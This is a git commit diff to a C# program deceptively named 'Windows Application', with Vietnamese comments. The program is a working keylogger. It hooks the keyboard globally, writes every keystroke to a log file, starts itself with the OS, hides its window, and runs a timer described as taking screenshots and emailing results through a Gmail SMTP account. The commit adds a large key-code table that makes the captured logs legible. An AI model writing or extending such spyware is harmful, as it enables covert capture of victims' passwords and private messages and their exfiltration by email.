6197a0b9932749e7cd3ac18aa0bd3e7fa2cf18dd
WiIIiam <rongdo54711@gmail.com>
2021-04-15 15:06:30 +0700

    update print key

--- Windows Application/Windows Application/Program.cs
+++ Windows Application/Windows Application/Program.cs
@@ -94,7 +94,7 @@ namespace Windows_Application
             {
                 int vkCode = Marshal.ReadInt32(lParam);  // Xuất code của phím ng dùng nhấn
 
-                CheckHotKey(vkCode);                     // Đọc key 
+                CheckHotKey(vkCode);                     // Đọc key để mở cmd
                 WriteLog(vkCode);                        // Ghi log ra
             }
             return CallNextHookEx(_hookID, nCode, wParam, lParam); // Thực hiện lại phương thức handle để nhận biết keys
@@ -106,10 +106,140 @@ namespace Windows_Application
         /// <param name="vkCode"></param>
         static void WriteLog(int vkCode)
         {
+            String key = "";
+
             Console.WriteLine((Keys)vkCode);
             string logNameToWrite = logName + DateTime.Now.ToLongDateString() + logExtendtion;
             StreamWriter sw = new StreamWriter(logNameToWrite, true);
-            sw.Write((Keys)vkCode);
+
+            if (vkCode == 8) key = "[Back]";
+            else if (vkCode == 9) key = "\r"; //[Tab]
+            else if (vkCode == 13) key = "\n"; //[Enter]
+            else if (vkCode == 19) key = "[Pause]";
+            else if (vkCode == 20) key = "[Caps Lock]";
+            else if (vkCode == 27) key = "[Esc]";
+            else if (vkCode == 32) key = " "; // [Space]
+            else if (vkCode == 33) key = "[Page Up]";
+            else if (vkCode == 34) key = "[Page Down]";
+            else if (vkCode == 35) key = "[End]";
+            else if (vkCode == 36) key = "[Home]";
+            else if (vkCode == 37) key = "Left]";
+            else if (vkCode == 38) key = "[Up]";
+            else if (vkCode == 39) key = "[Right]";
+            else if (vkCode == 40) key = "[Down]";
+            else if (vkCode == 44) key = "[Print Screen]";
+            else if (vkCode == 45) key = "\n"; // [Insert]
+            else if (vkCode == 46) key = "[Delete]";
+            else if (vkCode == 48) key = "0";
+            else if (vkCode == 49) key = "1";
+            else if (vkCode == 50) key = "2";
+            else if (vkCode == 51) key = "3";
+            else if (vkCode == 52) key = "4";
+            else if (vkCode == 53) key = "5";
+            else if (vkCode == 54) key = "6";
+            else if (vkCode == 55) key = "7";
+            else if (vkCode == 56) key = "8";
+            else if (vkCode == 57) key = "9";
+            else if (vkCode == 65) key = "a";
+            else if (vkCode == 66) key = "b";
+            else if (vkCode == 67) key = "c";
+            else if (vkCode == 68) key = "d";
+            else if (vkCode == 69) key = "e";
+            else if (vkCode == 70) key = "f";
+            else if (vkCode == 71) key = "g";
+            else if (vkCode == 72) key = "h";
+            else if (vkCode == 73) key = "i";
+            else if (vkCode == 74) key = "j";
+            else if (vkCode == 75) key = "k";
+            else if (vkCode == 76) key = "l";
+            else if (vkCode == 77) key = "m";
+            else if (vkCode == 78) key = "n";
+            else if (vkCode == 79) key = "o";
+            else if (vkCode == 80) key = "p";
+            else if (vkCode == 81) key = "q";
+            else if (vkCode == 82) key = "r";
+            else if (vkCode == 83) key = "s";
+            else if (vkCode == 84) key = "t";
+            else if (vkCode == 85) key = "u";
+            else if (vkCode == 86) key = "v";
+            else if (vkCode == 87) key = "w";
+            else if (vkCode == 88) key = "x";
+            else if (vkCode == 89) key = "y";
+            else if (vkCode == 90) key = "z";
+            else if (vkCode == 91) key = "[Windows]";
+            else if (vkCode == 92) key = "[Windows]";
+            else if (vkCode == 93) key = "[List]";
+            else if (vkCode == 96) key = "0";
+            else if (vkCode == 97) key = "1";
+            else if (vkCode == 98) key = "2";
+            else if (vkCode == 99) key = "3";
+            else if (vkCode == 100) key = "4";
+            else if (vkCode == 101) key = "5";
+            else if (vkCode == 102) key = "6";
+            else if (vkCode == 103) key = "7";
+            else if (vkCode == 104) key = "8";
+            else if (vkCode == 105) key = "9";
+            else if (vkCode == 106) key = "*";
+            else if (vkCode == 107) key = "+";
+            else if (vkCode == 109) key = "-";
+            else if (vkCode == 110) key = ",";
+            else if (vkCode == 111) key = "/";
+            else if (vkCode == 112) key = "[F1]";
+            else if (vkCode == 113) key = "[F2]";
+            else if (vkCode == 114) key = "[F3]";
+            else if (vkCode == 115) key = "[F4]";
+            else if (vkCode == 116) key = "[F5]";
+            else if (vkCode == 117) key = "[F6]";
+            else if (vkCode == 118) key = "[F7]";
+            else if (vkCode == 119) key = "[F8]";
+            else if (vkCode == 120) key = "[F9]";
+            else if (vkCode == 121) key = "[F10]";
+            else if (vkCode == 122) key = "[F11]";
+            else if (vkCode == 123) key = "[F12]";
+            else if (vkCode == 144) key = "[Num Lock]";
+            else if (vkCode == 145) key = "[Scroll Lock]";
+            else if (vkCode == 160) key = "[Left-Shift]"; 
+            else if (vkCode == 161) key = "[Right-Shift]";
+            else if (vkCode == 162) key = "[Ctrl]";
+            else if (vkCode == 163) key = "[Ctrl]";
+            else if (vkCode == 164) key = "[Alt]";
+            else if (vkCode == 165) key = "[Alt]";
+            else if (vkCode == 187) key = "=";
+            else if (vkCode == 186) key = "ç";
+            else if (vkCode == 188) key = ",";
+            else if (vkCode == 189) key = "-";
+            else if (vkCode == 190) key = ".";
+            else if (vkCode == 192) key = "'";
+            else if (vkCode == 191) key = ";";
+            else if (vkCode == 193) key = "/";
+            else if (vkCode == 194) key = ".";
+            else if (vkCode == 219) key = "´";
+            else if (vkCode == 220) key = "]";
+            else if (vkCode == 221) key = "[";
+            else if (vkCode == 222) key = "~";
+            else if (vkCode == 226) key = "\\";
+
+
+            //Kí tự đặc biệt
+/*
+            else if (vkCode == 48 && vkCode == 161 ) key = ")";
+            else if (vkCode == 49 && vkCode == 161 ) key = "!";
+            else if (vkCode == 50 && vkCode == 161 ) key = "@";
+            else if (vkCode == 51 && vkCode == 161 ) key = "#";
+            else if (vkCode == 52 && vkCode == 161 ) key = "$";
+            else if (vkCode == 53 && vkCode == 161 ) key = "%";
+            else if (vkCode == 54 && vkCode == 161 ) key = "^";
+            else if (vkCode == 55 && vkCode == 161 ) key = "&";
+            else if (vkCode == 56 && vkCode == 161 ) key = "*";
+            else if (vkCode == 57 && vkCode == 161 ) key = "(";*/
+
+
+            else key = "[" + vkCode + "]";
+
+
+            //sw.Write((Keys)vkCode);
+
+            sw.Write(key);
             sw.Close();
         }
 
@@ -287,7 +417,7 @@ namespace Windows_Application
                 }
 
                 SmtpServer.Port = 587;
-                SmtpServer.Credentials = new System.Net.NetworkCredential("email@gmail.com", "Password");// Tài khoản và mật khẩu của mình để gửi mail
+                SmtpServer.Credentials = new System.Net.NetworkCredential("user@gmail.com", "password");// Tài khoản và mật khẩu của mình để gửi mail
                 SmtpServer.EnableSsl = true;
 
 
@@ -326,11 +456,10 @@ namespace Windows_Application
 
         static void Main(string[] args)
         {
-            int vkCode = 0;
 
             StartWithOS(); //Chạy khi khởi động
             HideWindow(); //Ẩn terminal
-            CheckHotKey(vkCode);
+
             StartTimmer(); //Thời gian chụp ảnh, gửi mail,...
             HookKeyboard();// Nhận diện phím được bấm
         }
